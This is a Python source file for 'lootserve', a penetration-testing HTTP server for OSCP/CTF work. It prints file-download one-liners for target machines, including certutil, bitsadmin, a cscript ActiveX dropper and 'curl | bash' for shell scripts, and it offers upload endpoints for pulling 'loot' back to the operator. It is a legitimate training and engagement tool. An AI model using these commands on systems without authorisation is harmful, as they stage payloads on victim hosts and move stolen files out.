#!/usr/bin/env python3
"""
lootserve: tiny HTTP server for OSCP/CTF loot & file transfers.

Features:
- Static file serving
- Pre-generated wget/PowerShell one-liners
- Optional uploads via PUT/POST

Author: rzz0 (https://github.com/rzz0)
"""
import argparse
import errno
import os
import socket
import sys
import struct
import shutil
import shlex
from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler
from urllib.parse import quote as url_quote
from urllib.parse import unquote as url_unquote, urlparse, parse_qs
import time
import cgi
from typing import Optional
import json
import uuid
__version__ = "0.1.0"

# ---------- TTY / Colors ----------
def use_color(no_color: bool) -> bool:
    return (not no_color) and sys.stdout.isatty()

class Sty:
    def __init__(self, enabled: bool):
        self.enabled = enabled
    def c(self, code): return code if self.enabled else ""
    @property
    def B(self): return self.c("\033[1m")     # bold
    @property
    def D(self): return self.c("\033[0m")     # default/reset
    @property
    def CY(self): return self.c("\033[36m")   # cyan
    @property
    def GR(self): return self.c("\033[32m")   # green
    @property
    def YL(self): return self.c("\033[33m")   # yellow
    @property
    def MG(self): return self.c("\033[35m")   # magenta
    @property
    def BL(self): return self.c("\033[34m")   # blue

# ---------- IP helpers (tun0 by default) ----------
def _get_ip_by_iface_linux(iface: str) -> str:
    import fcntl
    SIOCGIFADDR = 0x8915
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ifreq = struct.pack("256s", iface[:15].encode("utf-8"))
        res = fcntl.ioctl(s.fileno(), SIOCGIFADDR, ifreq)
        return socket.inet_ntoa(res[20:24])
    except Exception:
        return ""

def get_display_ip(host_arg: str, iface: str) -> str:
    if host_arg not in ("0.0.0.0", "", None):
        return host_arg
    ip = _get_ip_by_iface_linux(iface)
    if ip:
        return ip
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"

# ---------- HTTP handler with optional logging & uploads ----------
def make_handler(verbose: bool, logfile: Optional[str],
                 upload_enabled: bool = False,
                 upload_dir: Optional[str] = None,
                 max_upload_mb: Optional[int] = None):
    class Handler(SimpleHTTPRequestHandler):
        server_version = "lootserve/1.0"
        sys_version = ""
        def log_message(self, format, *args):
            if not verbose and not logfile:
                return
            msg = "%s - - [%s] %s\n" % (
                self.client_address[0],
                self.log_date_time_string(),
                format % args,
            )
            if logfile:
                try:
                    with open(logfile, "a", encoding="utf-8") as f:
                        f.write(msg)
                except Exception:
                    sys.stdout.write(msg)
            else:
                sys.stdout.write(msg)

        def _upload_root(self) -> str:
            root = os.getcwd() if not upload_dir else os.path.abspath(upload_dir)
            return root

        def _safe_join(self, base: str, path: str) -> Optional[str]:
            norm = os.path.normpath(os.path.join(base, path))
            try:
                common = os.path.commonpath([base, norm])
            except Exception:
                return None
            if common != os.path.abspath(base):
                return None
            return norm

        def _read_exact(self, length: int, chunk: int = 1024 * 1024):
            remaining = length
            while remaining > 0:
                to_read = min(chunk, remaining)
                data = self.rfile.read(to_read)
                if not data:
                    break
                remaining -= len(data)
                yield data

        def _max_upload_bytes(self) -> Optional[int]:
            return None if max_upload_mb is None else max(0, int(max_upload_mb)) * 1024 * 1024

        def _write_response(self, code: int, body: str, content_type: str = "text/plain; charset=utf-8"):
            data = body.encode("utf-8")
            self.send_response(code)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        def _json_error(self, code: int, message: str):
            payload = json.dumps({"status": "error", "message": message})
            self._write_response(code, payload, content_type="application/json; charset=utf-8")

        def do_GET(self):
            if self.path.rstrip('/') == '/upload':
                if not upload_enabled:
                    self._json_error(405, "Uploads are disabled. Start with --upload to enable.")
                    return
                html = (
                    "<!doctype html><html><head><meta charset='utf-8'><title>Upload</title>"
                    "<style>body{font-family:system-ui,Segoe UI,Roboto,Arial;padding:2rem}"
                    "form{border:1px solid #ddd;padding:1rem;border-radius:8px;max-width:480px}" 
                    "</style></head><body>"
                    "<h2>File Upload</h2>"
                    "<form method='POST' action='/upload' enctype='multipart/form-data'>"
                    "<input type='file' name='file' required>"
                    "<button type='submit'>Upload</button>"
                    "</form>"
                    "<p>Destination: <code>%s</code></p>" % (self._upload_root(),) +
                    "</body></html>"
                )
                self._write_response(200, html, content_type="text/html; charset=utf-8")
                return
            return super().do_GET()

        def do_PUT(self):
            if not upload_enabled:
                self._json_error(405, "Uploads are disabled. Start with --upload to enable.")
                return

            # Expect target file path in the request URL path
            parsed = urlparse(self.path)
            rel = url_unquote(parsed.path.lstrip('/'))
            if not rel or rel.endswith('/'):
                self._json_error(400, "Invalid target path for PUT.")
                return
            base = self._upload_root()
            target = self._safe_join(base, rel)
            if not target:
                self._json_error(403, "Forbidden path.")
                return

            length = self.headers.get('Content-Length')
            if length is None:
                self._json_error(411, "Content-Length required.")
                return
            try:
                length = int(length)
            except ValueError:
                self._json_error(400, "Invalid Content-Length.")
                return

            maxb = self._max_upload_bytes()
            if maxb is not None and length > maxb:
                self._json_error(413, f"Payload too large (> {max_upload_mb} MB).")
                return

            os.makedirs(os.path.dirname(target), exist_ok=True)
            tmp_target = f"{target}.part.{uuid.uuid4().hex}"
            received = 0
            try:
                with open(tmp_target, 'wb') as f:
                    for chunk in self._read_exact(length):
                        if not chunk:
                            break
                        f.write(chunk)
                        received += len(chunk)
            except OSError as e:
                self._json_error(500, f"Write error: {e}")
                try:
                    if os.path.exists(tmp_target):
                        os.remove(tmp_target)
                except OSError:
                    pass
                return

            if received != length:
                try:
                    if os.path.exists(tmp_target):
                        os.remove(tmp_target)
                except OSError:
                    pass
                self._json_error(400, "Incomplete body received.")
                return

            try:
                os.replace(tmp_target, target)
            except OSError:
                # Fallback cleanup
                try:
                    if os.path.exists(tmp_target):
                        os.remove(tmp_target)
                except OSError:
                    pass
                self._json_error(500, "Failed to finalize upload.")
                return

            self.send_response(201)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.end_headers()
            out = {
                "status": "ok",
                "method": "PUT",
                "path": "/" + rel,
                "saved": os.path.relpath(target, base),
                "size": received,
            }
            self.wfile.write(json.dumps(out).encode('utf-8'))

        def do_POST(self):
            if not upload_enabled:
                self._json_error(405, "Uploads are disabled. Start with --upload to enable.")
                return

            parsed = urlparse(self.path)
            if parsed.path.rstrip('/') != '/upload':
                # Accept raw body with filename via header or query string
                self._handle_post_raw(parsed)
                return

            ctype = self.headers.get('Content-Type', '')
            if not ctype.startswith('multipart/form-data'):
                self._json_error(400, "Expected multipart/form-data at /upload.")
                return

            base = self._upload_root()
            maxb = self._max_upload_bytes()

            # Parse multipart form using cgi.FieldStorage (stdlib, no external deps)
            try:
                fs = cgi.FieldStorage(
                    fp=self.rfile,
                    headers=self.headers,
                    environ={
                        'REQUEST_METHOD': 'POST',
                        'CONTENT_TYPE': self.headers.get('Content-Type'),
                    }
                )
            except Exception as e:
                self._json_error(400, f"Malformed multipart: {e}")
                return

            saved = []
            def _save_fileitem(item):
                filename = item.filename or f"upload_{int(time.time())}"
                rel = filename
                target = self._safe_join(base, rel)
                if not target:
                    raise ValueError("Forbidden filename")
                os.makedirs(os.path.dirname(target), exist_ok=True)
                tmp_target = f"{target}.part.{uuid.uuid4().hex}"
                received = 0
                try:
                    with open(tmp_target, 'wb') as f:
                        while True:
                            chunk = item.file.read(1024 * 1024)
                            if not chunk:
                                break
                            received += len(chunk)
                            if maxb is not None and received > maxb:
                                raise ValueError("Payload too large")
                            f.write(chunk)
                    os.replace(tmp_target, target)
                except Exception:
                    try:
                        if os.path.exists(tmp_target):
                            os.remove(tmp_target)
                    except OSError:
                        pass
                    raise
                saved.append({"field": item.name, "filename": filename, "bytes": received, "saved": os.path.relpath(target, base)})

            try:
                if isinstance(fs, list):
                    for item in fs:
                        if item.filename:
                            _save_fileitem(item)
                else:
                    # FieldStorage behaves like a dict
                    for key in fs.keys():
                        field = fs[key]
                        if isinstance(field, list):
                            for item in field:
                                if getattr(item, 'filename', None):
                                    _save_fileitem(item)
                        else:
                            if getattr(field, 'filename', None):
                                _save_fileitem(field)
            except ValueError as ve:
                self._json_error(413 if 'large' in str(ve) else 400, str(ve))
                return
            except OSError as oe:
                self._json_error(500, f"Write error: {oe}")
                return

            body = {
                "status": "ok",
                "method": "POST",
                "saved": saved,
                "count": len(saved),
            }
            self._write_response(200, json.dumps(body), content_type="application/json; charset=utf-8")

        def _handle_post_raw(self, parsed):
            # Accept application/octet-stream with X-Filename header or ?filename=
            base = self._upload_root()
            params = parse_qs(parsed.query or '')
            filename = self.headers.get('X-Filename') or (params.get('filename', [None])[0])
            if not filename:
                self._json_error(400, "Missing filename (use X-Filename header or ?filename=)")
                return
            filename = url_unquote(filename)
            target = self._safe_join(base, filename)
            if not target:
                self._json_error(403, "Forbidden filename")
                return

            length = self.headers.get('Content-Length')
            if length is None:
                self._json_error(411, "Content-Length required.")
                return
            try:
                length = int(length)
            except ValueError:
                self._json_error(400, "Invalid Content-Length.")
                return

            maxb = self._max_upload_bytes()
            if maxb is not None and length > maxb:
                self._json_error(413, f"Payload too large (> {max_upload_mb} MB).")
                return
            os.makedirs(os.path.dirname(target), exist_ok=True)
            tmp_target = f"{target}.part.{uuid.uuid4().hex}"
            received = 0
            try:
                with open(tmp_target, 'wb') as f:
                    for chunk in self._read_exact(length):
                        if not chunk:
                            break
                        f.write(chunk)
                        received += len(chunk)
            except OSError as e:
                self._json_error(500, f"Write error: {e}")
                try:
                    if os.path.exists(tmp_target):
                        os.remove(tmp_target)
                except OSError:
                    pass
                return
            if received != length:
                try:
                    if os.path.exists(tmp_target):
                        os.remove(tmp_target)
                except OSError:
                    pass
                self._json_error(400, "Incomplete body received.")
                return
            try:
                os.replace(tmp_target, target)
            except OSError:
                try:
                    if os.path.exists(tmp_target):
                        os.remove(tmp_target)
                except OSError:
                    pass
                self._json_error(500, "Failed to finalize upload.")
                return
            body = {
                "status": "ok",
                "method": "POST",
                "saved": os.path.relpath(target, base),
                "size": received,
            }
            self._write_response(201, json.dumps(body), content_type="application/json; charset=utf-8")
    return Handler


class ReusableThreadingHTTPServer(ThreadingHTTPServer):
    allow_reuse_address = True


DEFAULT_PORT_CANDIDATES = (80, 8000, 8080, 8888, 8181)


def start_server_with_port_selection(host: str, requested_port: Optional[int], handler_cls, sty: Sty):
    """Bind the HTTP server, falling back to preferred ports when needed."""
    tried = set()
    candidates = []
    if requested_port is not None:
        candidates.append(requested_port)
    for port in DEFAULT_PORT_CANDIDATES:
        if port not in candidates:
            candidates.append(port)

    for port in candidates:
        if port in tried:
            continue
        tried.add(port)
        try:
            server = ReusableThreadingHTTPServer((host, port), handler_cls)
        except OSError as exc:
            if exc.errno == errno.EADDRINUSE:
                print(f"{sty.YL}⚠️  Port {port} is already in use. Trying next…{sty.D}")
                continue
            if exc.errno == errno.EACCES:
                print(f"{sty.YL}⚠️  Permission denied on port {port}. Trying next…{sty.D}")
                continue
            raise
        actual_port = server.server_address[1]
        if requested_port is not None and requested_port not in (0, actual_port):
            print(f"{sty.YL}ℹ️  Using alternative port {actual_port}.{sty.D}")
        return server, actual_port

    server = ReusableThreadingHTTPServer((host, 0), handler_cls)
    actual_port = server.server_address[1]
    print(f"{sty.YL}⚠️  All preferred ports are busy. Using dynamic port {actual_port}.{sty.D}")
    return server, actual_port

# ---------- Utils ----------
def human_size(bytes_: int) -> str:
    for unit in ["B","KB","MB","GB","TB"]:
        if bytes_ < 1024.0:
            return f"{bytes_:,.0f} {unit}".replace(",", ".")
        bytes_ /= 1024.0
    return f"{bytes_:,.0f} PB".replace(",", ".")

def list_regular_files(directory: str, recursive: bool = False):
    out = []
    if recursive:
        for root, dirs, files in os.walk(directory):
            dirs.sort()
            files.sort()
            for name in files:
                path = os.path.join(root, name)
                if not os.path.isfile(path):
                    continue
                try:
                    sz = os.path.getsize(path)
                except OSError:
                    sz = 0
                rel_path = os.path.relpath(path, directory)
                out.append((rel_path, sz))
    else:
        for name in sorted(os.listdir(directory)):
            path = os.path.join(directory, name)
            if os.path.isfile(path):
                try:
                    sz = os.path.getsize(path)
                except OSError:
                    sz = 0
                out.append((name, sz))
    return out

# ---------- Snippets ----------


def cmd_quote(arg: str) -> str:
    """Quote a string for cmd.exe command arguments."""
    return '"' + arg.replace('"', '""') + '"'


def ps_literal(arg: str) -> str:
    """Return a single-quoted PowerShell literal."""
    return "'" + arg.replace("'", "''") + "'"


def single_quote_literal(arg: str) -> str:
    """Escape a string for inclusion in a single-quoted literal."""
    return arg.replace("\\", "\\\\").replace("'", "\\'")


def win_cmds(url: str, filename: str):
    """Windows HTTP download methods (no SMB/FTP/TFTP),
    ordered from convenient to legacy-compatible."""
    cmds = []
    # Preferred
    ps_url = ps_literal(url)
    ps_filename = ps_literal(filename)
    cmd_url = cmd_quote(url)
    cmd_filename = cmd_quote(filename)

    cmds.append(f"powershell -Command \"iwr -UseBasicParsing {ps_url} -OutFile {ps_filename}\"")
    cmds.append(("powershell -Command \"[System.Net.ServicePointManager]::SecurityProtocol="
                 "[System.Net.SecurityProtocolType]::Tls12; "
                 f"(New-Object Net.WebClient).DownloadFile({ps_url},{ps_filename})\""))
    cmds.append(f"curl.exe -L -o {cmd_filename} {cmd_url}")
    # Classic/legacy
    cmds.append(f"certutil -urlcache -split -f {cmd_url} {cmd_filename}")
    # Avoid backslashes inside f-string expression (Python limitation)
    cmds.append("bitsadmin /transfer dl /priority foreground " + cmd_url + " " + cmd_quote('%CD%\\' + filename))
    cmds.append(f"powershell -Command \"Start-BitsTransfer -Source {ps_url} -Destination {ps_filename}\"")
    # Resilient using .NET HttpClient
    cmds.append((
        f"powershell -Command \"$u={ps_url};$p={ps_filename};"
        "Add-Type -AssemblyName System.Net.Http;"
        "$h=[System.Net.Http.HttpClient]::new();"
        "[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12;"
        "[IO.File]::WriteAllBytes($p, ($h.GetByteArrayAsync($u).GetAwaiter().GetResult()))\""
    ))
    # Very legacy: COM + ADODB (HTTP)
    js_url = single_quote_literal(url)
    js_filename = single_quote_literal(filename)
    cmds.append(("cmd /c \"echo var x=new ActiveXObject('MSXML2.XMLHTTP');"
                 f"x.open('GET','{js_url}',false);x.send();"
                 "var s=new ActiveXObject('ADODB.Stream');s.Type=1;s.Open();"
                 "s.Write(x.responseBody);s.SaveToFile('" + js_filename + "',2);\" > dl.js && cscript //nologo dl.js"))
    return cmds


def linux_cmds(url: str, filename: str):
    """Linux HTTP download methods (no SMB/FTP/TFTP/SSH),
    ordered from standard tools to accelerators and language one-liners."""
    cmds = []
    filename_arg = shlex.quote(filename)
    url_arg = shlex.quote(url)
    single_quoted_url = single_quote_literal(url)
    single_quoted_filename = single_quote_literal(filename)
    # Preferred
    cmds.append(f"wget -O {filename_arg} {url_arg}")
    cmds.append(f"curl -o {filename_arg} {url_arg}")
    if filename.lower().endswith('.sh'):
        cmds.append(f"curl -fsSL {url_arg} | bash")
    # Accelerators
    cmds.append(f"aria2c -x16 -s16 -o {filename_arg} {url_arg}")
    cmds.append(f"axel -n 10 -o {filename_arg} {url_arg}")
    # Language one-liners
    cmds.append(("python3 -c \"import urllib.request as u; "
                 f"u.urlretrieve('{single_quoted_url}','{single_quoted_filename}')\""))
    cmds.append(f"perl -MLWP::Simple -e \"getstore('{single_quoted_url}','{single_quoted_filename}')\"")
    # Post-download
    cmds.append(f"chmod +x {filename_arg}")
    return cmds

def one_liner(client: str, url: str, filename: str) -> str:
    """Return a compact, preferred download command for the given client OS."""
    if client == "windows":
        return (
            f"powershell -Command "
            f"\"iwr -UseBasicParsing {ps_literal(url)} -OutFile {ps_literal(filename)}\""
        )
    elif client == "linux":
        return f"wget -O {shlex.quote(filename)} {shlex.quote(url)}"
    else:
        raise ValueError(f"Unsupported client: {client}")

# ---------- Pretty printing ----------
def print_header(sty: Sty, title: str):
    width = shutil.get_terminal_size((100, 20)).columns
    bar = "─" * max(10, min(width-2, 78))
    print(f"{sty.CY}{bar}{sty.D}\n{sty.B}{title}{sty.D}\n{sty.CY}{bar}{sty.D}")

def print_file_block_compact_dual(sty: Sty, url: str, display_name: str, size: int, download_name: str):
    """Compact output: one-liners for Linux and Windows."""
    size_txt = human_size(size)
    print(f"{sty.B}•{sty.D} {display_name} {sty.MG}[{size_txt}]{sty.D}")
    # Linux (wget)
    print(f"  {sty.BL}Linux:{sty.D}   {one_liner('linux', url, download_name)}")
    # Windows (iwr)
    print(f"  {sty.BL}Windows:{sty.D} {one_liner('windows', url, download_name)}")

def print_file_block(sty: Sty, url: str, display_name: str, size: int, client: str, compact: bool, download_name: str):
    size_txt = human_size(size)
    if compact:
        print(f"{sty.B}•{sty.D} {display_name} {sty.MG}[{size_txt}]{sty.D}")
        print(f"  {one_liner(client, url, download_name)}")
        return

    # Full block with URL + multiple methods
    print(f"{sty.B}📄 {display_name}{sty.D} {sty.MG}[{size_txt}]{sty.D}")
    print(f"{sty.GR}URL:{sty.D} {url}")
    if client == "windows":
        print(f"{sty.BL}Windows (CMD/PowerShell):{sty.D}")
        for c in win_cmds(url, download_name):
            print(f"  {c}")
    else:
        print(f"{sty.BL}Linux:{sty.D}")
        for c in linux_cmds(url, download_name):
            print(f"  {c}")
    print()

def print_listing(sty: Sty, base_ip: str, port: int, directory: str, client: Optional[str], full: bool, recursive: bool):
    files = list_regular_files(directory, recursive=recursive)
    if not files:
        print(f"{sty.YL}⚠️  No files in the current directory.{sty.D}")
        return

    # Title
    if client:
        title = f"Available files (compact) · commands for {client}"
    else:
        title = "Available files (compact) · Linux & Windows one-liners"
    print_header(sty, title)

    for name, size in files:
        url_path = "/".join(url_quote(part) for part in name.split(os.sep))
        url = f"http://{base_ip}:{port}/{url_path}"
        display_name = name
        download_name = os.path.basename(name)
        if client:
            # Single client chosen
            print_file_block(sty, url, display_name, size, client, compact=not full, download_name=download_name)
        else:
            # Default: compact for both Linux & Windows
            if full:
                # Full: show full blocks for both OS
                print(f"{sty.B}📄 {display_name}{sty.D} {sty.MG}[{human_size(size)}]{sty.D}")
                print(f"{sty.GR}URL:{sty.D} {url}")
                print(f"{sty.BL}Linux:{sty.D}")
                for c in linux_cmds(url, download_name): print(f"  {c}")
                print(f"{sty.BL}Windows:{sty.D}")
                for c in win_cmds(url, download_name): print(f"  {c}")
                print()
            else:
                # Compact (default)
                print_file_block_compact_dual(sty, url, display_name, size, download_name)

# ---------- Main ----------
def main():
    parser = argparse.ArgumentParser(
        description="lootserve: tiny HTTP server for OSCP/CTF loot & file transfers."
    )
    parser.add_argument("-V", "--version", action="version", version=f"%(prog)s {__version__}")
    parser.add_argument("-p", "--port", type=int, help="Port to listen on (optional; tries 80,8000,8080,8888,8181).")
    parser.add_argument("-H", "--host", default="0.0.0.0", help="Bind address (default: 0.0.0.0).")
    parser.add_argument("-d", "--dir", default=".", help="Directory to serve (default: current dir).")
    parser.add_argument("-r", "--recursive", action="store_true",
                        help="Include files from subdirectories in the printed listing.")
    parser.add_argument("--iface", default="tun0", help="Interface to discover the display IP (default: tun0).")
    parser.add_argument("-v", "--verbose", action="store_true", help="Show access logs (GET/200, etc.).")
    parser.add_argument("--logfile", default=None, help="Write access logs to a file (optional).")
    parser.add_argument("--client", choices=["linux", "windows"],
                        help="Restrict commands to the specified OS. Without this, show Linux and Windows.")
    parser.add_argument("--full", action="store_true",
                        help="Show detailed mode (all methods). Default is compact.")
    parser.add_argument("--no-color", action="store_true", help="Disable colored output/emojis.")
    parser.add_argument("--upload", action="store_true", help="Enable file uploads via PUT/POST.")
    parser.add_argument("--upload-dir", default=None, help="Directory to save uploads (default: served dir).")
    parser.add_argument("--max-upload-mb", type=int, default=None, help="Optional max upload size in MB.")
    args = parser.parse_args()

    sty = Sty(use_color(args.no_color))

    if not os.path.isdir(args.dir):
        print(f"Error: directory does not exist: {args.dir}", file=sys.stderr)
        sys.exit(1)

    display_ip = get_display_ip(args.host, args.iface)

    os.chdir(args.dir)

    Handler = make_handler(
        args.verbose, args.logfile,
        upload_enabled=args.upload,
        upload_dir=args.upload_dir,
        max_upload_mb=args.max_upload_mb,
    )
    try:
        httpd, selected_port = start_server_with_port_selection(args.host, args.port, Handler, sty)
    except OSError as e:
        print(f"Error starting server: {e}", file=sys.stderr)
        sys.exit(2)

    print_listing(sty, display_ip, selected_port, os.getcwd(), args.client, args.full, args.recursive)

    args.port = selected_port

    print_header(sty, "Server")
    print(f"📡 {sty.B}URL:{sty.D} http://{display_ip}:{args.port}/  {sty.YL}(CTRL+C to quit){sty.D}")
    print(f"📁 {sty.B}Directory:{sty.D} {os.getcwd()}")
    print(f"🔌 {sty.B}Bind:{sty.D} {args.host}  |  {sty.B}Interface for URLs:{sty.D} {args.iface}")
    if args.upload:
        updir = args.upload_dir or os.getcwd()
        lim = f" · limit: {args.max_upload_mb} MB" if args.max_upload_mb else ""
        print(f"⬆️  {sty.B}Uploads:{sty.D} ENABLED → {updir}{lim}")
        print(f"   PUT:   curl -T file http://{display_ip}:{args.port}/file")
        print(f"   POST:  curl -F file=@file http://{display_ip}:{args.port}/upload")
        print(f"   POST*: curl --data-binary @file -H 'X-Filename: file' http://{display_ip}:{args.port}/raw")
    if args.verbose:
        xtra = f" and {args.logfile}" if args.logfile else ""
        print(f"📝 Access log: ON (stdout{xtra})")
    elif args.logfile:
        print(f"📝 Access log → {args.logfile}")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down…")
    finally:
        httpd.server_close()

if __name__ == "__main__":
    main()
